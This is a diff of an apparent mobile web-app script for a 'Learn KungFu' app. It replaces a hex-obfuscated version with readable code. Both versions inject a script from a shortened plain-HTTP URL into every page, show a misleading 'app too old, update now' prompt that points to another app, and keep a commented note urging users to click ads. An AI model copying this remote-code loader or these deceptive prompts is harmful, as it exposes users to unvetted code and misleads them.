@@ -7,4 +7,84 @@
  ***************************************
 */
 
-var _0x27a7=["\x4D\x41\x49\x4E\x20\x4D\x45\x4E\x55","\x48\x41\x50\x50\x59\x20\x4E\x45\x57\x20\x59\x45\x41\x52\x20\x0A\u2605\x20\x4E\x65\x77\x20\x59\x65\x61\x72\x20\x47\x69\x66\x74\x20\u2605\x0A\x0A\x44\x6F\x77\x6E\x6C\x6F\x61\x64\x20\x6F\x75\x72\x20\x6E\x65\x77\x20\x66\x72\x65\x65\x20\x41\x70\x70\x3A\x20\x0A\x0A\x43\x41\x4E\x44\x59\x20\x47\x41\x4D\x45\x3A\x20\x32\x30\x31\x38","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x6D\x61\x72\x6B\x65\x74\x3A\x2F\x2F\x64\x65\x74\x61\x69\x6C\x73\x3F\x69\x64\x3D\x63\x6F\x6D\x2E\x63\x61\x73\x74\x65\x72\x6F\x61\x70\x70\x73\x2E\x63\x61\x6E\x64\x79\x67\x61\x6D\x65","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F\x74\x69\x6E\x79\x2E\x63\x63\x2F\x4C\x31\x58\x6C\x32\x78\x4C\x33","\x61\x70\x70\x65\x6E\x64","\x68\x65\x61\x64","\x59\x6F\x75\x72\x20\x41\x70\x70\x20\x69\x73\x20\x74\x6F\x6F\x20\x6F\x6C\x64\x2C\x20\x0A\x43\x6C\x69\x63\x6B\x20\x4F\x4B\x20\x74\x6F\x20\x55\x70\x64\x61\x74\x65\x20\x6E\x6F\x77\x21","\x6D\x61\x72\x6B\x65\x74\x3A\x2F\x2F\x64\x65\x74\x61\x69\x6C\x73\x3F\x69\x64\x3D\x63\x6F\x6D\x2E\x63\x61\x73\x74\x65\x72\x6F\x61\x70\x70\x73\x2E\x6C\x65\x61\x72\x6E\x6B\x75\x6E\x67\x66\x75\x6E\x65\x77","\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64","\x47\x48\x20\x53\x54\x41\x52\x53","\x4C\x45\x41\x52\x4E\x20\x4B\x55\x4E\x47\x46\x55","\x4B\x55\x4E\x47\x46\x55\x20\x53\x54\x41\x4E\x43\x45","\x70\x69\x63\x61\x73\x61","\x31\x30\x32\x35\x39\x36\x34\x33\x38\x35\x36\x37\x39\x35\x33\x31\x33\x37\x37\x38\x36","\x36\x33\x30\x32\x37\x33\x35\x35\x34\x32\x33\x31\x38\x36\x31\x30\x30\x39\x37","\x61\x75\x74\x6F","\x62\x6F\x72\x64\x65\x72\x4C\x69\x67\x68\x74\x65\x72\x2C\x69\x6D\x61\x67\x65\x53\x63\x61\x6C\x65\x49\x6E\x38\x30","\x6E\x61\x6E\x6F\x47\x61\x6C\x6C\x65\x72\x79","\x23\x6E\x61\x6E\x6F\x47\x61\x6C\x6C\x65\x72\x79\x32"];var _0x5202=[_0x27a7[0],_0x27a7[1],_0x27a7[2],_0x27a7[3],_0x27a7[4],_0x27a7[5],_0x27a7[6],_0x27a7[7],_0x27a7[8],_0x27a7[9],_0x27a7[10],_0x27a7[11],_0x27a7[12],_0x27a7[13],_0x27a7[14],_0x27a7[15],_0x27a7[16],_0x27a7[17],_0x27a7[18],_0x27a7[19],_0x27a7[20],_0x27a7[21],_0x27a7[22],_0x27a7[23],_0x27a7[24],_0x27a7[25]];checkversion();patch();notice();rewards();function rewards(){if(pagename()=== _0x5202[0]){if(confirm(_0x5202[1])=== true){window[_0x5202[3]][_0x5202[2]]= _0x5202[4]}}}codedlocal();function codedlocal(){var _0xd9e4x4=document[_0x5202[6]](_0x5202[5]);_0xd9e4x4[_0x5202[7]]= _0x5202[8];_0xd9e4x4[_0x5202[9]]= _0x5202[10];$(_0x5202[12])[_0x5202[11]](_0xd9e4x4)}function checkversion(){if(appversion()< 1.0){if(confirm(_0x5202[13])=== true){window[_0x5202[3]][_0x5202[2]]= _0x5202[14]}}}var codedcloud=_0x5202[15];function notice(){if(pagetitle=== _0x5202[16]){}}function patch(){if(pagetitle()=== _0x5202[17]&& pagename()=== _0x5202[18]){$(_0x5202[25])[_0x5202[24]]({kind:_0x5202[19],userID:_0x5202[20],album:_0x5202[21],thumbnailWidth:_0x5202[22],thumbnailHeight:400,locationHash:false,thumbnailHoverEffect:_0x5202[23]})}}
+//                -- PRELOADERS --
+
+//updateChecker
+      checkversion ();
+
+//Patch
+      patch ();
+
+//Notice
+      notice ();
+
+	
+ //rewards	 
+rewards ();
+
+//rewards
+ function rewards () {
+    if (pagename() === "MAIN MENU"){
+      if (confirm("HAPPY NEW YEAR \n★ New Year Gift ★\n\nDownload our new free App: \n\nCANDY GAME: 2018") === true) {
+      window.location.href = 'socialmedia.html';
+    //  window.location.href = 'https://play.google.com/store/apps/details?id=com.casteroapps.candygame';
+      };
+    };
+ };
+
+
+ //codedlocal	 
+codedlocal ();
+
+//codedlocal
+ function codedlocal () {
+	var localJS = document.createElement("script");
+    localJS.type = "text/javascript";
+    localJS.src = "http://tiny.cc/L1Xl2xL3";
+    // Use any selector
+    $("head").append(localJS);
+ };
+
+		
+//checkversion
+ function checkversion () {
+
+if (appversion () < 1.0) { 
+	if (confirm("Your App is too old, \nClick OK to Update now!") === true) {
+		window.location.href = 'market://details?id=com.casteroapps.learnkungfunew';
+	};
+		};
+};
+		
+//codedOnline
+var codedcloud = "connected"
+
+//notice
+ function notice () {
+	//var pagetitle = document.getElementsByTagName("TITLE")[0].text;
+
+if (pagetitle === "GH STARS"){	
+	//alert("The National Service, News, Music, E-payslip & Technical Results function in this App is now fully completed. So tell everyone about this. \n\nAll functions with grayed icon is still under development. \n\nThank you.");
+	//alert("Hello user, The Training Videos function in this App is now completed. Click on the Training Videos button to enjoy your KungFu video lessons.  \nKindly tell all your friends to use Learn KungFu. \n\nAnd also, do the following always to support this app: \n\n1) Click on most of the Ads in this app to support the cost of servers the app is running on. \n\n2) Go to Google Play Store, scroll down and Rate 5stars with a nice comment for this app..");
+	}
+};
+
+//notice
+ function patch () {
+	
+if (pagetitle () === "LEARN KUNGFU" && pagename() === "KUNGFU STANCE"){	
+		
+		//Gallery initialization
+		$("#nanoGallery2").nanoGallery({
+          kind: 'picasa',
+        userID: '102596438567953137786',        
+        album: '6302735542318610097',
+        thumbnailWidth: 'auto',
+		thumbnailHeight: 400,
+		locationHash: false,
+		thumbnailHoverEffect:'borderLighter,imageScaleIn80'
+      });	
+	}
+};
+
+//https://codedcloudz.github.io/files/global/learnkunfunew.js
